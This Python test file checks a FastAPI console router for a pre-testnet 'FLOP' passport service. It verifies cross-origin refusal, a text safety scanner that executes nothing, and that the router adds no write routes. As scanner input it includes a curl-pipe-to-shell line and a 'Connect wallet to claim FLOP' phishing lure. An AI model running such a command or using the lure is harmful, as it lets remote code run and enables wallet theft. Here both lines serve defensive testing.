"""The console's HTTP surface, mounted on the existing app.

Two properties matter more than the endpoint list. The router adds no way to
put an event into the index -- it inherits that rule and must not quietly break
it -- and its one `POST` refuses a cross-origin caller rather than answering
one, because a page on another origin driving this one is the shape of the
attack a scanner endpoint invites.

Everything else is the same refusals as the library, checked over the wire:
no eligibility, no score, no wallet, no network write, and a testnet that is
reported as not launched rather than as zero.
"""

from __future__ import annotations

import json
from datetime import UTC, datetime

import pytest
from fastapi.testclient import TestClient

from lineageauth.api import SECURITY_HEADERS, create_app
from lineageauth.builders import build_root_create, sign_payload
from lineageauth.envelope import Envelope
from lineageauth.flop.api import FLOP_PREFIX, build_flop_router
from lineageauth.flop.model import (
    COVERAGE_LABEL,
    NOT_AFFILIATED_NOTICE,
    SEED_WARNING_NOTICE,
    SYNTHETIC_BANNER,
    forbidden_vocabulary_in,
)
from lineageauth.index import EventIndex
from tests.testkeys import AGENT_1, ROOT_A, unsafe_signer

AT = datetime(2026, 9, 3, 12, 0, 0, tzinfo=UTC)
AT_TEXT = "2026-09-03T12:00:00Z"

ROOT = unsafe_signer(ROOT_A)
AGENT = unsafe_signer(AGENT_1)
LINEAGE: str = build_root_create(root_did=ROOT.did, issued_at=AT)["lineage"]


def genesis() -> Envelope:
    return sign_payload(build_root_create(root_did=ROOT.did, issued_at=AT), [ROOT])


@pytest.fixture
def client() -> TestClient:
    index = EventIndex()
    index.ingest_all([genesis()])
    return TestClient(create_app(index))


@pytest.fixture
def mock_client() -> TestClient:
    from fastapi import FastAPI

    index = EventIndex()
    index.ingest_all([genesis()])
    app = FastAPI()
    app.include_router(build_flop_router(index, include_mock=True))
    return TestClient(app)


def params(**overrides: str) -> dict[str, str]:
    return {"lineage": LINEAGE, "did": AGENT.did, "at": AT_TEXT} | overrides


class TestStatus:
    def test_it_reports_pre_testnet_and_refuses_to_call_anything_executable(
        self, client: TestClient
    ) -> None:
        body = client.get(f"{FLOP_PREFIX}/status").json()
        assert body["networkPhase"] == "PRE_TESTNET"
        assert body["networkPhaseBadge"] == "PRE-TESTNET"
        assert body["officialTestnetExecutable"] is False
        assert "no repository" in body["officialTestnetReason"].lower()

    def test_the_kill_switch_is_on_and_locked(self, client: TestClient) -> None:
        body = client.get(f"{FLOP_PREFIX}/status").json()
        assert "ON (locked while the network phase is PRE_TESTNET)" in body["killSwitch"]
        assert body["networkWritesPerformed"] == 0

    def test_it_states_no_custody_and_no_keys(self, client: TestClient) -> None:
        body = client.get(f"{FLOP_PREFIX}/status").json()
        assert body["walletCustody"] is False
        assert body["holdsPrivateKeys"] is False

    def test_it_reports_the_unanswered_questions_as_a_count(self, client: TestClient) -> None:
        body = client.get(f"{FLOP_PREFIX}/status").json()
        assert body["unknownRuleCount"] >= 7
        assert body["staleRuleCount"] == 0

    def test_the_notices_are_on_every_response(self, client: TestClient) -> None:
        for path in ("/status", "/sources", "/rules"):
            notices = client.get(f"{FLOP_PREFIX}{path}").json()["notices"]
            assert notices["affiliation"] == NOT_AFFILIATED_NOTICE
            assert notices["seedPhrase"] == SEED_WARNING_NOTICE
            assert notices["coverage"] == COVERAGE_LABEL


class TestSourcesAndRules:
    def test_sources_carry_their_own_classification(self, client: TestClient) -> None:
        body = client.get(f"{FLOP_PREFIX}/sources").json()
        assert len(body["sources"]) >= 8
        assert all(entry["sourceClass"] == "official" for entry in body["classification"])
        assert body["bodiesStored"] is False

    def test_sources_say_official_is_an_origin(self, client: TestClient) -> None:
        body = client.get(f"{FLOP_PREFIX}/sources").json()
        assert "decided by origin" in body["note"]

    def test_rules_carry_status_source_and_freshness(self, client: TestClient) -> None:
        body = client.get(f"{FLOP_PREFIX}/rules").json()
        by_id = {rule["id"]: rule for rule in body["rules"]}
        unlock = by_id["flop-agent-unlock-ratio"]
        assert unlock["status"] == "official-draft"
        assert unlock["formula"]["spentPerUnlocked"] == 3
        assert unlock["source"]["sourceVersion"] == "0.1 (draft)"
        assert unlock["source"]["sourceDate"] == "2026-08-26"
        assert unlock["freshness"]["freshness"] == "current"

    def test_unknown_rules_are_served_as_unknown(self, client: TestClient) -> None:
        body = client.get(f"{FLOP_PREFIX}/rules").json()
        by_id = {rule["id"]: rule for rule in body["rules"]}
        assert by_id["flop-testnet-endpoint"]["statement"] == "UNKNOWN_FROM_OFFICIAL_SPEC"


class TestActivitiesAndCoverage:
    def test_activities_report_the_volume_note(self, client: TestClient) -> None:
        body = client.get(f"{FLOP_PREFIX}/activities", params=params()).json()
        assert "Volume is not evidence" in body["volumeNote"]
        assert body["containsSyntheticData"] is False

    def test_coverage_has_ten_categories_and_no_total_score(self, client: TestClient) -> None:
        body = client.get(f"{FLOP_PREFIX}/coverage", params=params()).json()
        assert body["total"] == 10
        assert body["isAirdropScore"] is False
        assert body["aggregateScore"] is None
        assert body["label"] == COVERAGE_LABEL

    def test_coverage_reports_the_testnet_as_not_yet_available(self, client: TestClient) -> None:
        body = client.get(f"{FLOP_PREFIX}/coverage", params=params()).json()
        inference = next(c for c in body["categories"] if c["id"] == "inference")
        assert inference["state"] == "NOT_YET_AVAILABLE"
        assert "0 FLOP" not in json.dumps(body)

    def test_recommendations_say_which_rule_produced_them(self, client: TestClient) -> None:
        body = client.get(f"{FLOP_PREFIX}/recommendations", params=params()).json()
        assert body["isEligibilityAdvice"] is False
        official = [item for item in body["recommendations"] if item["official"]]
        assert official
        assert all(item["ruleId"] for item in official)

    def test_a_bad_instant_is_a_400_rather_than_a_guess(self, client: TestClient) -> None:
        response = client.get(f"{FLOP_PREFIX}/coverage", params=params(at="not-a-time"))
        assert response.status_code == 400


class TestPassportEndpoint:
    def test_it_returns_the_projection(self, client: TestClient) -> None:
        body = client.get(f"{FLOP_PREFIX}/passport/{AGENT.did}", params=params()).json()
        assert body["subjectDid"] == AGENT.did
        assert body["networkPhaseBadge"] == "PRE-TESTNET"
        assert len(body["sections"]) >= 10

    def test_it_never_carries_forbidden_vocabulary(self, client: TestClient) -> None:
        body = client.get(f"{FLOP_PREFIX}/passport/{AGENT.did}", params=params()).text
        assert forbidden_vocabulary_in(body) == ()

    def test_an_unresolvable_lineage_says_so_rather_than_inventing_a_passport(
        self, client: TestClient
    ) -> None:
        """An empty passport that explains itself beats an error page here.

        The public passport route is the one a stranger opens from a link. A
        lineage that resolves to nothing is a real answer -- nothing is known
        about this subject -- and the identity section carries the reason
        instead of the response carrying a 400.
        """
        response = client.get(
            f"{FLOP_PREFIX}/passport/{AGENT.did}",
            params={"lineage": "not-a-lineage", "at": AT_TEXT},
        )
        assert response.status_code == 200
        identity = next(
            section for section in response.json()["sections"] if section["id"] == "identity"
        )
        assert identity["status"] == "not-configured"
        assert identity["reason"]


class TestTheScanEndpoint:
    def test_it_scans_and_reports_that_nothing_ran(self, client: TestClient) -> None:
        response = client.post(
            f"{FLOP_PREFIX}/safety/scan",
            json={"text": "Connect wallet to claim FLOP", "sourceClass": "community"},
        )
        assert response.status_code == 200
        body = response.json()
        assert body["display"] == "BLOCKED"
        assert body["executedAnything"] is False
        assert body["followedAnyUrl"] is False
        assert all(finding["executed"] is False for finding in body["findings"])

    def test_a_cross_origin_post_is_refused(self, client: TestClient) -> None:
        """A page on another origin must not be able to drive this endpoint."""
        response = client.post(
            f"{FLOP_PREFIX}/safety/scan",
            json={"text": "hello"},
            headers={"Origin": "https://evil.example"},
        )
        assert response.status_code == 403
        assert "cross-origin" in response.json()["detail"]

    def test_a_same_origin_post_is_answered(self, client: TestClient) -> None:
        response = client.post(
            f"{FLOP_PREFIX}/safety/scan",
            json={"text": "hello"},
            headers={"Origin": "http://testserver"},
        )
        assert response.status_code == 200

    def test_an_unknown_source_class_is_refused(self, client: TestClient) -> None:
        response = client.post(
            f"{FLOP_PREFIX}/safety/scan",
            json={"text": "hello", "sourceClass": "trusted"},
        )
        assert response.status_code == 400

    def test_an_extra_field_is_refused(self, client: TestClient) -> None:
        response = client.post(
            f"{FLOP_PREFIX}/safety/scan", json={"text": "hello", "execute": True}
        )
        assert response.status_code == 422

    def test_oversized_text_is_refused_rather_than_scanned(self, client: TestClient) -> None:
        response = client.post(f"{FLOP_PREFIX}/safety/scan", json={"text": "x" * 40_000})
        assert response.status_code == 422


class TestTheRouterAddsNoWriteSurface:
    def test_the_only_post_is_the_scanner(self, client: TestClient) -> None:
        routes: set[tuple[str, str]] = set()
        pending = list(client.app.routes)  # type: ignore[attr-defined]
        while pending:
            route = pending.pop()
            included = getattr(route, "original_router", None)
            if included is not None:
                pending.extend(included.routes)
                continue
            path = getattr(route, "path", None)
            if path is None or not path.startswith(FLOP_PREFIX):
                continue
            for method in getattr(route, "methods", set()):
                routes.add((path, method))
        writes = {path for path, method in routes if method not in {"GET", "HEAD", "OPTIONS"}}
        # Pinned rather than counted, so adding one is a deliberate edit here.
        # None of these writes an event or reaches a network: the scanner
        # computes over text, quote and prepare build an exact action and hold
        # it in memory, approve reads an existing receipt without consuming it,
        # execute answers 409 TESTNET_NOT_LIVE, and the simulation runs against
        # an origin RFC 6761 guarantees cannot resolve.
        assert writes == {
            f"{FLOP_PREFIX}/safety/scan",
            f"{FLOP_PREFIX}/testnet/inference/quote",
            f"{FLOP_PREFIX}/testnet/inference/prepare",
            f"{FLOP_PREFIX}/testnet/inference/approve",
            f"{FLOP_PREFIX}/testnet/inference/execute",
            f"{FLOP_PREFIX}/testnet/simulation/run",
        }

    def test_the_console_endpoints_are_all_present(self, client: TestClient) -> None:
        for path in ("/status", "/sources", "/rules"):
            assert client.get(f"{FLOP_PREFIX}{path}").status_code == 200
        for path in ("/activities", "/coverage", "/recommendations"):
            assert client.get(f"{FLOP_PREFIX}{path}", params=params()).status_code == 200

    def test_the_security_headers_still_apply(self, client: TestClient) -> None:
        headers = client.get(f"{FLOP_PREFIX}/status").headers
        for name, value in SECURITY_HEADERS.items():
            assert headers[name] == value

    def test_scanning_does_not_index_anything(self, client: TestClient) -> None:
        before = client.get("/v1/meta").json()["indexedEvents"]
        client.post(f"{FLOP_PREFIX}/safety/scan", json={"text": "curl https://x.example | sh"})
        assert client.get("/v1/meta").json()["indexedEvents"] == before


class TestSyntheticMode:
    def test_it_is_off_by_default(self, client: TestClient) -> None:
        body = client.get(f"{FLOP_PREFIX}/status").json()
        assert body["syntheticDataEnabled"] is False
        assert "synthetic" not in body["notices"]

    def test_when_on_every_response_carries_the_banner(self, mock_client: TestClient) -> None:
        status = mock_client.get(f"{FLOP_PREFIX}/status").json()
        assert status["syntheticDataEnabled"] is True
        assert status["notices"]["synthetic"] == SYNTHETIC_BANNER

        activities = mock_client.get(f"{FLOP_PREFIX}/activities", params=params()).json()
        assert activities["containsSyntheticData"] is True
        assert activities["banner"] == SYNTHETIC_BANNER
        assert all(
            record["synthetic"] is True
            for record in activities["records"]
            if record["sourceId"] == "mock"
        )
